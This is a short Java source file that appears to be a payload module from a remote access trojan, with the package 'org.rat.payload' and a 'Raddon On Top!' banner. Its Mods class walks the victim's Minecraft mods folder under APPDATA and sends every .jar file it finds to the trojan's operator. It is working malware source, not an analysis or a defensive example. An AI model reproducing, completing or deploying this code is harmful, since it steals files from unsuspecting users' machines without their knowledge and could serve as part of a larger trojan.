//Raddon On Top!

package org.rat.payload.payloads;

import org.rat.payload.*;
import org.rat.util.*;
import java.io.*;
import java.util.*;

public class Mods implements IPayload
{
    public void run() {
        for (final File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\mods")) {
            if (file.getName().endsWith(".jar")) {
                this.send(file);
            }
        }
    }
}
